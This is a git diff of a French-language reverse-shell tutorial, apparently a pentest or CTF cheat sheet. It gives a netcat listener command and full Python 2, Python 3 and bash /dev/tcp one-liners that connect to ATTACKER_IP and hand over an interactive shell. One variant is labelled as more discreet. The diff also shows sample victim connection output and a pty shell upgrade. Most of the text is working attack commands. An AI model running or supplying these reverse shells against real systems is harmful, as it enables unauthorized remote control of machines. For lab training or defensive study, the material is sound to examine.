@@ -13,26 +13,35 @@ Avant de lancer la commande sur la cible, démarre un listener sur ta machine d�
 
 nc -lvnp 4444  
 > Ouvre un port d'écoute (ici 4444) avec Netcat pour recevoir la connexion de la cible.
-
+> -l	Mode écoute, en attente d'une connexion.
+> -v	Mode verbeux, pour savoir quand une connexion est établie.
+> -n	Désactivez la résolution DNS et connectez-vous uniquement depuis/vers des adresses IP afin d'accélérer la connexion.
+> -p 1234	Le numéro de port netcatest en écoute, et la connexion inverse doit être envoyée à cette adresse.
 ---
 
 ## 🐍 ÉTAPE 2 : Reverse Shell Python (sur la cible)
 
 ### 🧪 Vérifier que Python est installé :
 
+```
 which python  
 which python3
+```
 
 ### 🔧 Lancer le reverse shell :
 
 #### Version Python 2
 
+```
 python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
 
+```
 #### Version Python 3
 
+```
 python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 
+```
 🧠 Remplace ATTACKER_IP par ton IP (souvent `tun0` si VPN).
 
 ---
@@ -41,16 +50,22 @@ python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_I
 
 ### 🧪 Vérifier que Bash est disponible :
 
+```
 which bash
 
+```
 ### 🔧 Lancer le reverse shell :
 
+```
 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1  
+```
 > Utilise le redirection de flux vers un socket TCP.
 
 Variante plus discrète (si la première ne passe pas) :
 
+```
 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196  
+```
 
 💡 Bash TCP fonctionne seulement si `/dev/tcp/` est activé (c’est le cas sur beaucoup de systèmes Linux).
 
@@ -60,8 +75,10 @@ Variante plus discrète (si la première ne passe pas) :
 
 Si tout se passe bien, tu verras apparaître dans ton Netcat :
 
+```
 connect to [YOUR_IP] from (UNKNOWN) [VICTIM_IP] 43210  
 sh-4.2$
+```
 
 > Tu as maintenant un shell interactif sur la machine cible.
 
@@ -73,7 +90,9 @@ Le shell peut être lent ou ne pas supporter les touches comme flèches, tab, et
 
 Amélioration dans Netcat :
 
+```
 python -c 'import pty; pty.spawn("/bin/bash")'  
+```
 > Donne un shell pseudo-TTY.
 
 Puis :  
